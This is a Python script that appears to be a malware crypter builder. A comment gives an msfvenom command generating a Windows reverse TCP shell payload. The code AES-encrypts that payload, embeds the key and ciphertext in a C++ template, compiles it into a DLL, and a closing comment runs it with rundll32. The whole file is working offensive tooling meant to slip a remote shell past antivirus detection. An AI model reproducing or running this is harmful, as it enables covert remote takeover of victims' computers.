import subprocess
import sys      #sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT= 4444 -f raw > calc.bin
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import urandom
import hashlib
import time

def AESencrypt(plaintext, key):
    k = hashlib.sha256(key).digest()
    iv = 16 * b'\x00'
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext,key
    
try:
    file = open("calc.bin", "rb")
    content = file.read()
except:
    print("Usage: .\AES_cryptor.py PAYLOAD_FILE")
    sys.exit()

KEY = urandom(16)
ciphertext, key = AESencrypt(content, KEY)

key1 = '0x' + ', 0x'.join(hex(x)[2:] for x in key)
sh = '0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext)

with open("template.cpp", "r", encoding="utf-8") as f:
    cpp_code = f.read()

cpp_code = cpp_code.replace("key[] = { }", f"key[] = { {key1} }").replace("'", "")
cpp_code = cpp_code.replace("pay[] = { }", f"pay[] = { {sh} }").replace("'", "")

with open("temp.cpp", "wb") as f:
    f.write(cpp_code.encode("utf-8"))

time.sleep(2)
compiler = r'"C:\Program Files\CodeBlocks\MinGW\bin\x86_64-w64-mingw32-g++.exe"'
source_file = "temp.cpp"
output_file = "hello.dll"
flags = "-shared -fpermissive"

command = f"{compiler} {flags} -o {output_file} {source_file}"
exit_code = os.system(command)
#rundll32.exe hello.dll, DllRegisterServer